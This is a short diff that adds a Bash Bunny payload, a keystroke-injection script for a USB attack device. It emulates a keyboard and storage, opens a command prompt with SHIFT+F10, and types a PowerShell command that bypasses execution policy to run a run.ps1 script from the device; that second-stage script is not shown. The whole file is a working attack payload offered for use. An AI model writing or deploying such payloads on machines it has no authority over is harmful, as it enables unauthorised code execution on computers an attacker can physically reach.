@@ -1,0 +1,15 @@
+#!/bin/bash
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+# Stage 1 - Powershell
+LED ATTACK
+Q SHIFT F10
+sleep 3
+Q STRING powershell -executionpolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\run.ps1')"
+Q ENTER
+
+LED ATTACK
+######## FINISH ########
+LED FINISH
